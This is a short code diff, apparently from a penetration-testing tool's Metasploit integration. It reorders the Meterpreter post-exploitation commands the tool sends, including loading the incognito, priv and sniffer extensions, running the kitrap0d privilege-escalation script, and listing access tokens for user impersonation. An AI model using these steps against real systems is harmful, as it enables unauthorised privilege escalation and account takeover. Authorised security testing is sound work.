@@ -443,15 +443,20 @@ class Metasploit:
             proc.stdin.write("sessions -l\n")
             proc.stdin.write("sessions -i %s\n" % metSess)
 
-        proc.stdin.write("getuid\n")
-
         proc.stdin.write("use espia\n")
         proc.stdin.write("use incognito\n")
         proc.stdin.write("use priv\n")
         proc.stdin.write("use sniffer\n")
+        proc.stdin.write("sysinfo\n")
 
         if conf.privEsc:
             print
+
+            infoMsg  = "trying to escalate privileges using "
+            infoMsg += "kitrap0d script"
+            logger.info(infoMsg)
+
+            proc.stdin.write("run kitrap0d\n")
 
             infoMsg  = "displaying the list of Access Tokens availables. "
             infoMsg += "Choose which user you want to impersonate by "
@@ -460,11 +465,8 @@ class Metasploit:
 
             proc.stdin.write("list_tokens -u\n")
 
-            infoMsg  = "trying also to escalate privileges using "
-            infoMsg += "kitrap0d script"
-            logger.info(infoMsg)
+            proc.stdin.write("getuid\n")
 
-            proc.stdin.write("run kitrap0d\n")
 
     def __controlMsfCmd(self, proc, func):
         stdin_fd = sys.stdin.fileno()
